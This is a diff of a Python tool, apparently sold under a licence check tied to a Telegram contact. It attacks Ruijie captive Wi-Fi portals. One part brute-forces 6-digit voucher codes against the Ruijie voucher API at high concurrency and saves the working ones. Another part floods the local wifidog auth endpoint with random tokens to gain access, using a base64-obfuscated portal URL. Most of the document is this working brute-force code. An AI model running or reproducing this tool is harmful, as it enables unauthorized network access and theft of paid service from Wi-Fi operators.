@@ -40,42 +40,45 @@ def Logo():
  | |  | | |__| | |____    | |_) |_|
  |_|  |_|\____/|______|   |____/(_)
                                    
-{g}              Created by MOEYU [STABLE]{w}"""
+{g}              Created by MOEYU [ULTRA STABLE]{w}"""
     print(logo)
     Line()
     print(f"{w}[♠️] Created by Moe Yu")
     print(f"{w}[♣️] Telegram: @starlink112")
-    print(f"{w}[♦️] Status: Fixed ID Mode")
+    print(f"{w}[♦️] Status: Fixed ID Locked")
     Line()
 
-# --- FIXED ID SYSTEM (တစ်ခါ run တိုင်း မပြောင်းတော့ပါ) ---
+# --- FIXED ID SYSTEM (MAC Address မသုံးတော့ဘဲ စနစ်ကို ပြောင်းထားသည်) ---
 def get_hwid():
-    """စက်ရဲ့ hardware အချက်အလက်တွေကို သုံးပြီး ပုံသေ ID ထုတ်ယူခြင်း"""
+    """ဖုန်းရဲ့ hardware အချက်အလက်တွေကို သုံးပြီး ပုံသေ ID ထုတ်ယူခြင်း (MAC မပါ)"""
     try:
-        # ၁။ User Name + OS Platform + CPU Count ကို ယူတယ်
-        # ၂။ UUID Node (MAC) ကို ယူတယ် (ပြောင်းလဲနိုင်ပေမဲ့ hash ထဲမှာ အစိတ်အပိုင်းအဖြစ်သုံးမယ်)
-        # ၃။ အားလုံးပေါင်းပြီး MD5 နဲ့ Hash လုပ်လိုက်တဲ့အတွက် အမြဲတမ်း ပုံသေနီးပါး ထွက်နေပါမယ်
-        info = f"{os.getlogin() if hasattr(os, 'getlogin') else 'user'}-{sys.platform}-{os.cpu_count()}"
-        node = str(uuid.getnode())
-        combined = (info + node).encode()
-        fixed_id = hashlib.md5(combined).hexdigest()[:12].upper()
-        return f"MOEYU-{fixed_id}"
+        # MAC Address (uuid.getnode) ကို မသုံးတော့ပါ (အဲ့ဒါကြောင့် ID ခဏခဏပြောင်းတာပါ)
+        # အစားထိုးအနေနဲ့ User ID, CPU count နဲ့ စက်ရဲ့ နာမည်ကို သုံးပါမယ်
+        user = os.environ.get('USER', 'default')
+        arch = os.environ.get('ARCH', 'unknown')
+        cpu = str(os.cpu_count())
+        
+        # ဤအချက်အလက်များကို ပေါင်းပြီး Hash လုပ်ပါမယ်
+        raw_id = f"{user}-{arch}-{cpu}-MOEYU-STABLE"
+        fixed_hash = hashlib.sha1(raw_id.encode()).hexdigest()[:12].upper()
+        return f"MY-{fixed_hash}"
     except:
-        return "MOEYU-STABLE-ID"
+        return "MY-STABLE-USER"
 
 def check_license():
     Logo()
     my_hwid = get_hwid()
+    # Github URL
     key_url = "https://raw.githubusercontent.com/hhtethtet277-svg/moeyu/refs/heads/main/key.txt"
     
-    print(f"{b}[*] Your HWID: {y}{my_hwid}{w}")
-    print(f"{b}[*] Checking license status...{w}")
+    print(f"{b}[*] Your ID: {y}{my_hwid}{w}")
+    print(f"{b}[*] Checking License...{w}")
     
     try:
-        # GitHub က data ကို cache မမိအောင် random string ထည့်ပြီးဆွဲမယ်
-        response = requests.get(f"{key_url}?v={random.random()}", timeout=10)
+        # Cache မမိအောင် Random Params ထည့်ဆွဲပါမယ်
+        response = requests.get(f"{key_url}?t={time.time()}", timeout=15)
         if response.status_code != 200:
-            print(f"{r}[!] Server connection failed.{w}")
+            print(f"{r}[!] Server Error! Check your Internet.{w}")
             sys.exit()
             
         data = response.text.splitlines()
@@ -83,47 +86,46 @@ def check_license():
         
         for line in data:
             if "|" in line:
-                db_hwid, exp_date = line.split("|")
-                if db_hwid.strip() == my_hwid:
+                db_id, exp_date = line.split("|")
+                if db_id.strip() == my_hwid:
                     found = True
                     expiry = datetime.strptime(exp_date.strip(), "%Y-%m-%d")
                     if datetime.now() < expiry:
-                        print(f"{g}[+] Access Granted! Expires: {exp_date}{w}")
+                        print(f"{g}[+] Verified! Expires: {exp_date}{w}")
                         time.sleep(2)
                         return True
                     else:
-                        print(f"{r}[!] License Expired: {exp_date}{w}")
+                        print(f"{r}[!] License Expired on {exp_date}{w}")
                         sys.exit()
         
         if not found:
-            print(f"{r}[!] HWID Not Registered!{w}")
-            print(f"{y}[>] Please send your HWID to Admin.{w}")
+            print(f"{r}[!] ID Not Registered!{w}")
+            print(f"{y}[>] Send this ID to Admin: {w}{my_hwid}")
             sys.exit()
             
     except Exception as e:
-        print(f"{r}[!] Security Error: {str(e)}{w}")
+        print(f"{r}[!] Connection Failed: {str(e)}{w}")
         sys.exit()
 
-# --- CORE LOGIC ---
-async def get_session_id(session, session_url):
-    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
+# --- CORE FEATURES ---
+async def get_session_id(session, url):
     try:
-        async with session.get(session_url, headers=headers) as req:
-            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
+        async with session.get(url) as r:
+            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url)).group(1)
     except: return None
 
 class InternetAccess:
     def __init__(self):
-        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
+        self.url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
 
     async def execute(self):
         Logo()
-        async with aiohttp.ClientSession() as session:
-            sid = await get_session_id(session, self.session_url)
+        async with aiohttp.ClientSession() as s:
+            sid = await get_session_id(s, self.url)
             while True:
                 try:
                     p = {'token': sid, 'phoneNumber': "".join(random.choice(string.digits) for _ in range(6))}
-                    async with session.post('http://192.168.0.1:2060/wifidog/auth?', params=p) as res:
+                    async with s.post('http://192.168.0.1:2060/wifidog/auth?', params=p) as res:
                         ping_st = await asyncio.to_thread(ping3.ping, 'google.com')
                         ms = int(ping_st*1000) if ping_st else '??'
                         print(f"{w}[{time.strftime('%H:%M:%S')}] Status: {g}{res.status}{w} | Ping: {g}{ms}{w}ms")
@@ -131,15 +133,15 @@ class InternetAccess:
                 await asyncio.sleep(1)
 
 class VoucherCode:
-    def __init__(self, length=6, speed=50):
-        self.length, self.speed = length, speed
-        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
+    def __init__(self, l=6, s=50):
+        self.l, self.s = l, s
+        self.url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
 
-    async def login(self, session, sid, v):
+    async def login(self, s, sid, v):
         try:
-            url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
-            async with session.post(url, json={"accessCode": v, "sessionId": sid, "apiVersion": 1}) as req:
-                if 'logonUrl' in await req.text():
+            u = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
+            async with s.post(u, json={"accessCode": v, "sessionId": sid, "apiVersion": 1}) as r:
+                if 'logonUrl' in await r.text():
                     print(f'\n{g}[SUCCESS] {v}{w}')
                     open("success.txt", "a").write(v + "\n")
                 else: print(f'{w}[*] Testing: {y}{v}{w}', end='\r')
@@ -147,22 +149,21 @@ class VoucherCode:
 
     async def execute(self):
         Logo()
-        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.speed)) as session:
-            sid = await get_session_id(session, self.session_url)
+        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.s)) as s:
+            sid = await get_session_id(s, self.url)
             while True:
-                tasks = [self.login(session, sid, "".join(random.choice(string.digits) for _ in range(self.length))) for _ in range(self.speed)]
-                await asyncio.gather(*tasks)
+                ts = [self.login(s, sid, "".join(random.choice(string.digits) for _ in range(self.l))) for _ in range(self.s)]
+                await asyncio.gather(*ts)
 
 def main():
     check_license()
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-o", "--option", choices=["code", "internet"], required=True)
-    parser.add_argument("-l", "--length", type=int, default=6)
-    parser.add_argument("-s", "--speed", type=int, default=50)
-    args = parser.parse_args()
-
-    if args.option == "internet": asyncio.run(InternetAccess().execute())
-    else: asyncio.run(VoucherCode(length=args.length, speed=args.speed).execute())
+    p = argparse.ArgumentParser()
+    p.add_argument("-o", "--option", choices=["code", "internet"], required=True)
+    p.add_argument("-l", "--length", type=int, default=6)
+    p.add_argument("-s", "--speed", type=int, default=50)
+    a = p.parse_args()
+    if a.option == "internet": asyncio.run(InternetAccess().execute())
+    else: asyncio.run(VoucherCode(l=a.length, s=a.speed).execute())
 
 if __name__ == "__main__":
     try: main()
